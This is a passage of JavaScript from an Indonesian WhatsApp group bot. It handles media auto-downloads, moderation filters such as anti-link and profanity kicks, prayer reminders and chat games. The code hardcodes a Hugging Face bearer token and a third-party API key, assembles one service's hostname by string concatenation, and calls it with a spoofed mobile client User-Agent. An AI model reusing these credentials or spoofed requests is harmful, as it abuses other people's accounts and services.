} else if (levelRole <= 10000000000) {
role = 'OWNER 🤖'
}



// Push Message To Console
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m MAKIMA - BOT\x1b[1;37m]', time, chalk.green(budy.slice(0, 100) || m.mtype), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
}

_sewa.expiredCheck(juna, sewa)
_prem.expiredCheck(juna, premium)
_mingguan.expiredMingguanCheck(juna, mingguan)
_bulanan.expiredBulananCheck(juna, bulanan)


setInterval(() => {
for (let i of Object.values(opengc)) {
if (Date.now() >= i.time) {
juna.groupSettingUpdate(i.id, "not_announcement")
.then((res) =>
juna.sendMessage(i.id, { text: `Sukses, group telah dibuka` }))
.catch((err) =>
juna.sendMessage(i.id, { text: 'Error' }))
delete opengc[i.id]
fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
}
}
}, 1000)
// auto set bio
if (setting.autobio){
if (setting.autobio === false) return
let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
await juna.setStatus(`I'm ${juna.user.name} 🤖 | ${runtime(process.uptime())} ⏰ | Status : ${juna.mode ? "Public Mode" : "Self Mode"} | 76${pendaftar.length} Users`)
settingstatus = new Date() * 1
}
}

/////
var bodynyaui = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
 for (let zeeone of setiker){
	if (!bodynyaui && budy === zeeone){
		result = fs.readFileSync(`./database/${zeeone}.webp`)
		await juna.imgToSticker(m.chat, result, m, {packname: `Sticker Maker\nNomor Bot :` , author: `MAKIMA - BOT\n+62 856-4311-5199` })
		}
		}
for (let zeeonee of audionye){
if (!bodynyaui && budy === zeeonee){
result = fs.readFileSync(`./database/${zeeonee}.mp3`)
juna.sendAudio(m.chat, result, m, true)
}
}
for (let zeeoneee of imagenye){
if (!bodynyaui && budy === zeeoneee){
result = fs.readFileSync(`./database/${zeeoneee}.jpg`)
juna.sendImage(m.chat, result, '', m)
}
}
for (let zeeonew of videonye){
if (!bodynyaui && budy === zeeonew){
result = fs.readFileSync(`./database/${zeeonew}.mp4`)
juna.sendVideo(m.chat, result, false, "",m)
}
}
async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function getPosiCmdUser(sender, _db) {
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].jid === sender) {
posi = i
}
})
return posi
}

async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

// Store
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
juna.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
juna.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
const sendFileFromUrl = async (from, url, caption, mek, men) => {
let mime = '';
let res = await axios.head(url)
mime = res.headers['content-type']
if (mime.split("/")[1] === "gif") {
return juna.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, gifPlayback: true, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
let type = mime.split("/")[0]+"Message"
if(mime === "application/pdf"){
return juna.sendMessage(m.chat, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, mentions: men ? men : []}, {quoted: m })
}
if(mime.split("/")[0] === "image"){
return juna.sendMessage(m.chat, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: m})
}
if(mime.split("/")[0] === "video"){
return juna.sendMessage(m.chat, { video: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'video/mp4'}, {quoted: m})
}
if(mime.split("/")[0] === "audio"){
return juna.sendMessage(m.chat, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg'}, {quoted: m })
}
}
// Auto Read & Presence Online
if (!m.key.fromMe && setting.autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await juna.readMessages([readkey]);
}

juna.sendPresenceUpdate('available', m.chat)


// Auto Block +212
if (m.sender.startsWith('212') && setting.autoblok212 === true) {
return juna.updateBlockStatus(m.sender, 'block')
}

if (!m.isGroup && !m.key.fromMe && setting.autorespond && !isCmd) {
simi = await fetchJson(`https://aemt.me/openai?text=${budy}`)
m.reply('_' + simi.result +'_') 
}
if (!m.isGroup && !setting.autorespond && !m.key.fromMe && (isAutoAiPc || setting.auto_ai_japri) && !isCmd) {
try {
simi = await fetchJson(`https://aemt.me/openai?text=${budy}`)
m.reply('_' + simi.result +'_') 
} catch (err) {
//console.log(err);
m.reply("Upss error silahkan hubungi owner agar di fix")
//m.reply(JSON.stringify(err));
}
}
if (m.isGroup && !m.key.fromMe && (isAutoAiGc || setting.auto_ai_grup) && !isCmd) {
try {
simi = await fetchJson(`https://aemt.me/openai?text=${budy}`)
m.reply('_' + simi.result +'_') 
} catch (err) {
//console.log(err);
m.reply("Upss error silahkan hubungi owner agar di fix")
//m.reply(JSON.stringify(err));
}
}
//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
try{
await ytdl.getInfo(Link);
let mp4File = getRandom('.mp4')
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {
await juna.sendMessage(m.chat, { video: fs.readFileSync(mp4File), caption: "Nih!",gifPlayback: false},{quoted: m})
fs.unlinkSync(`./${mp4File}`)
})
} catch(err) {
m.reply(`${err}`)
}
}


//DOWNLOAD MP3
const downloadMp3 = async (Link ,name = "Audio", opt = "audio") => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3')
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {
if(opt == "audio") await juna.sendMessage(m.chat, {audio:  fs.readFileSync(mp3File), mimetype: 'audio/mpeg' },{ quoted: m })
if(opt == "doc") await juna.sendMessage(m.chat, { document: fs.readFileSync(mp3File), fileName: name, mimetype: 'audio/mpeg'  }, { quoted: m })
fs.unlinkSync(mp3File)
})
} catch (err){
console.log(color(err))
}
}

//Anti Virtex
if (isAntivirtex) {
if (budy.length > 4000) {
bales(`*「 VIRTEX DETECTOR 」*\n\nSepertinya kamu mengirimkan virtex, maaf kamu akan di kick`)
if (!isBotAdmins) return bales(`Anjir lupa gw bukan admin`)
if (isAdmins) return bales(`Gajadi, Kamu admin`)
if (isCreator) return bales(`Gajadi, Kamu ownerku`)
await juna.sendMessage(m.chat, { delete: m.key })
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
//Auto Download
if (isAutodlgc && !isCmd) {
if (budy.match(`youtu`)) {
m.reply(`*「 YT LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`)
try{
let info = await ytdl.getInfo(budy);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if (audioFormats[0].contentLength == "undefined") return m.reply('Saat ini sedang mengalami gangguan ')
if (Number(low) >= 3000000 && !isPremium) {
return m.reply(`File Audio [ ${Number(low) / 100000} MB ], Anda Hanya Dapat Mendownload File Berukuran *30 MB* Dan Untuk Pengguna *Premium* Maksimal *150 MB*`) 
}
if (Number(low) >= 15000000 && isPremium) {
return m.reply(`File Audio [ ${Number(low) / 100000} MB ], Telah Melebihi *Batas Maksimum!*`) 
}
downloadMp3(budy) 
}catch (error) {
m.reply(`*URL in valid*`);
}
}
if (budy.match(`tiktok.com`) && !isAntiLinktt) {
m.reply(`*「 TT LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`)
try{
let snaptik = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=GataDios&url=${budy}`)
juna.sendMessage(m.chat, { video: { url: snaptik.result.link }, caption: `Done boss ✅`}, {quoted: m})
}catch (error) {
m.reply(`Maaf video ini tidak dapat di download\n\nCoba gunakan:\n.tiktok ${budy}`);
}
}
if (budy.match(`instagram.com`)) {
m.reply(`*「 IG LINK DETECTED 」*\n\n_Tunggu Sebentar, File Anda Sedang Didownload Secara Otomatis_`)
try{
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${budy}`)
juna.sendMessage(m.chat, { video: { url: anu.result[0].url}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`*URL in valid*`);
}
}
}
//Anti Toxic
if (isAntitoxic) {
if (budy.match(`raimu|Raimu|anj|Anj|asu|Asu|asw|Asw|Ajg|ajg|Anjing|anjing|Bajingan|bajingan|Bjingan|bjingan|Babi|babi|Bacot|bacot|Bcot|bcot|Cacat|cacat|Jancok|jancok|Jncok|jncok|Kontol|kontol|Kntl|kntl|KONTOL|kirek|Kirek|Lonte|lonte|Lnte|lnte|Memek|memek|Mmek|mmek|Pler|pler|Silet|Silit|silit|Silet|Tai|tai|Taek|taek`)) {
if (!isBotAdmins) return 
if (isAdmins) return
if (isCreator) return
await juna.sendMessage(m.chat, { delete: m.key })
if (isToxic(m.sender, isPremium, isCreator, toxicCount, toxic)) {
m.reply(`*「 TOXIC DETECTOR 」*\n\nSepertinya kamu berkata kasar lebih dari *${toxicCount}X*, maaf kamu akan di kick`)
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
resetToxic(m.sender, parseInt(toxicCount), toxic)
} else {
let toxicnye = `${getToxic(m.sender, toxicCount, toxic)}`
m.reply(`*「 TOXIC DETECTOR 」*\n\nJika kamu toxic *${toxicnye}X* lagi maka kamu akan di kick`)
toxicAdd(m.sender, toxic)
}
}
}


// Anti Link
if (isAntiLink) {
if (budy.match(`chat.whatsapp.com`)) {
bales(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await juna.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Gajadi, Karena kamu ngirim link group ini`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await juna.sendMessage(m.chat, { delete: m.key })
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if (isAntiLink2 && !isAntiLink) {
if (budy.match(`chat.whatsapp.com`)) {
bales(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf pesan kamu telah kami hapus`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await juna.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return m.reply(`Gajadi, Karena kamu ngirim link group ini`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await juna.sendMessage(m.chat, { delete: m.key })
}
}
//Antilink TikTok
if (isAntiLinktt) {
if (budy.match(`tiktok.com`)) {
bales(`*「 TIKTOK LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
if (isAdmins) return m.reply(`Gajadi, kamu admin`)
if (isCreator) return m.reply(`Gajadi, kamu owner ku`)
await juna.sendMessage(m.chat, { delete: m.key })
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
// Kick Me
if (isKickMe) {
if (budy.match(`in kel`)) {
await m.reply(`Siap Laksanakan`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
if (isAdmins) return m.reply(`Kenapa Mau Out Sayang🥺`)
if (isCreator) return m.reply(`Kenapa Mau Out Sayang🥺`)
m.reply(`Done Awokwok`) 
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}

if(!isCreator && setting.gruponly && !m.isGroup){
return
}
if(!isCreator && setting.pconly && m.isGroup){
return
}
// Mute
if (m.isGroup && isMute) {
if (!isAdmins && !isCreator) return
}

// Banned
if (isCmd) {
addCountCmd(`${command}`, m.sender, _cmd)
if (spamdetek.isFiltered(m.sender)) return bales(`*「 SPAM DETECTOR 」*\n\nSlow Kak~~~\nJangan Buru² (Try at 5 seconds)`)
spamdetek.addFilter(m.sender)
if (isBan) return m.reply(`Sistem Mendeteksi Anda Melakukan Spam, Anda Telah Di Banned Untuk Sementara!!`)
}
// Anti Wame
if (isAntiWame) {
if (budy.match(`wa.me|Wa.me`)) {
bales(`*「 WA ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link Whatsapp, maaf kamu akan di kick`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await juna.sendMessage(m.chat, { delete: m.key })
juna.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
if (m.isGroup && isAntiWame2 && !isAntiWame && !isCreator && !isAdmins && isBotAdmins){
if (budy.match(`wa.me`)){
if (!isBotAdmins) return //m.reply(`Untung bot bukan admin`)
await juna.sendMessage(m.chat, { delete: m.key })
}
}

const jam4 = moment().format("HH:mm")
if (jam4 === '04:37' && !m.key.fromMe && isCmd) return juna.sendTextWithMentions(m.chat, `Hai kak @${m.sender.split('@')[0]},\nWaktu *Shubuh* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*03:53 WIB*\n_untuk wilayah Semarang dan sekitarnya._`, fkontak)
if (jam4 === '11:59' && !m.key.fromMe && isCmd) return juna.sendTextWithMentions(m.chat, `Hai kak @${m.sender.split('@')[0]},\nWaktu *Dzuhur* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*11:25 WIB*\n_untuk wilayah Semarang dan sekitarnya._`, fkontak)
if (jam4 === '15:16' && !m.key.fromMe && isCmd) return juna.sendTextWithMentions(m.chat, `Hai kak @${m.sender.split('@')[0]},\nWaktu *Ashr* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*14:40 WIB*\n_untuk wilayah Semarang dan sekitarnya._`, fkontak)
if (jam4 === '18:02' && !m.key.fromMe && isCmd) return juna.sendTextWithMentions(m.chat, `Hai kak @${m.sender.split('@')[0]},\nWaktu *Maghrib* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*17:36 WIB*\n_untuk wilayah Semarang dan sekitarnya._`, fkontak)
if (jam4 === '19:12' && !m.key.fromMe && isCmd) return juna.sendTextWithMentions(m.chat, `Hai kak @${m.sender.split('@')[0]},\nWaktu *Isya* telah tiba, ambilah air wudhu dan segeralah shalat🙂.\n\n*18:47 WIB*\n_untuk wilayah Semarang dan sekitarnya._`, fkontak)


// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in db.data.sticker)) {
let hash = db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: juna.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, juna.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
juna.ev.emit('messages.upsert', msg)
}
async function bales(teks) {
juna.sendText(m.chat, teks, fkontak)
}
async function newReply(teks) {
const nedd = { text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: ucapanWaktu,
body: `Jangan Lupa Bernafas ^_^`,
previewType: "PHOTO",
thumbnailUrl: pathimg, 
sourceUrl: instagram}}
};
      return juna.sendMessage(m.chat, nedd, {
        quoted: fkontak,
      });
    }
async function jarak(dari, ke) {
	let html = (await axios(`https://www.google.com/search?q=${encodeURIComponent('jarak ' + dari + ' ke ' + ke)}&hl=id`)).data
	let $ = cheerio.load(html), obj = {}
	let img = html.split("var s=\'")?.[1]?.split("\'")?.[0]
	obj.img = /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,` [1], 'base64') : ''
	obj.desc = $('div.BNeawe.deIvCb.AP7Wnd').text()?.trim()
	return obj
}
async function diff(data) {
	const response = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await response.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
		Methods.includes(method) ? (method = method) : (method = Methods[0]);
		let buffer,
			Form = new FormData(),
			scheme = "https" + "://" + "inferenceengine" + ".vyro" + ".ai/" + method;
		Form.append("model_version", 1, {
			"Content-Transfer-Encoding": "binary",
			contentType: "multipart/form-data; charset=uttf-8",
		});
		Form.append("image", Buffer.from(urlPath), {
			filename: "enhance_image_body.jpg",
			contentType: "image/jpeg",
		});
		Form.submit(
			{
				url: scheme,
				host: "inferenceengine" + ".vyro" + ".ai",
				path: "/" + method,
				protocol: "https:",
				headers: {
					"User-Agent": "okhttp/4.9.3",
					Connection: "Keep-Alive",
					"Accept-Encoding": "gzip",
				},
			},
			function (err, res) {
				if (err) reject();
				let data = [];
				res
					.on("data", function (chunk, resp) {
						data.push(chunk);
					})
					.on("end", () => {
						resolve(Buffer.concat(data));
					});
				res.on("error", (e) => {
					reject();
				});
			}
		);
	})
}
async function botjawab () {
var nedd = [
`Halo!✍︎`, 
`Halo! Bot✍︎`, 
`Halo! Bot Disini✍︎`, 
`Halo! Bot Disini\n✍︎`, 
`Halo! Bot Disini\nAda✍︎`,
`Halo! Bot Disini\nAda Yang✍︎`,
`Halo! Bot Disini\nAda Yang Bisa✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?\n✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?\n\n✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?\n\nKetik✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?\n\nKetik #allmenu✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?\n\nKetik #allmenu Untuk✍︎`,
`Halo! Bot Disini\nAda Yang Bisa Saya Bantu?\n\nKetik #allmenu Untuk Mengakses...︎`
]
let { key } = await juna.sendMessage(m.chat, {text: 'Loading'}, {quoted: fkontak })

for (let i = 0; i < nedd.length; i++) {
await delay(50)
await juna.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
async function loading () {
var nedd = [
"Loading [ 3% ]", 
"Loading [ 7% ]", 
"Loading [ 14% ]", 
"Loading [ 19% ]", 
"Loading [ 26% ]",
"Loading [ 31% ]",
"Loading [ 33% ]",
"Loading [ 38% ]",
"Loading [ 42% ]",
"Loading [ 46% ]",
"Loading [ 54% ]",
"Loading [ 67% ]",
"Loading [ 75% ]",
"Loading [ 98% ]",
"Loading Selesai..."
]
let { key } = await juna.sendMessage(m.chat, {text: 'Loading'})

for (let i = 0; i < nedd.length; i++) {
await delay(10)
await juna.sendMessage(m.chat, {text: nedd[i], edit: key });
}
}
const junaa = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(m.chat ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
        'isAnimated': []
}}}
//TicTacToe
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
m.reply(`@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
m.reply(`Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`)
if (!roof.pilih) juna.sendMessage(roof.p, { text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`})
if (!roof.pilih2) juna.sendMessage(roof.p2, { text: `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`})
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) m.reply(`Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
m.reply(`@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) juna.sendMessage(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) juna.sendMessage(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
juna.sendMessage(roof.asal, { text: `_*Hasil Suit*_${tie ? '\nSERI' : ''}\n\n@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}\n@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}`.trim()}, m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await juna.sendText(room.x, str, m, { mentions: parseMention(str) } )
await juna.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//`
if (fs.existsSync(`./database/casino/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'n') {
juna.sendMessage(m.chat, { text: `「 Game Casino Rejected 」\n\n• @${casinoo.Y.split("@")[0]} Membatalkan Game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && budy.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenangnya adalah [ @${casinoo.Z} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
await addBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenangnya adalah [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: $ ${nebal(casinoo.nominal)}`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
await addBalance(`${casinoo.Y}`, nebal(casinoo.nominal), balance)
await kurangBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `🎰 Casino Game 💰

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Games Draw, Tidak Ada Pemenang`
juna.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}
}
}
//game
const JwbTrue = (tebak, exp) => {
return`*🎮 ${tebak} 🎮*\n\nJawaban Benar 🎉\n+Rp ${exp} balance`
}
const waktuHabis = (jawaban) => {
return `Waktu Habis\nJawaban: *${jawaban}*`
}
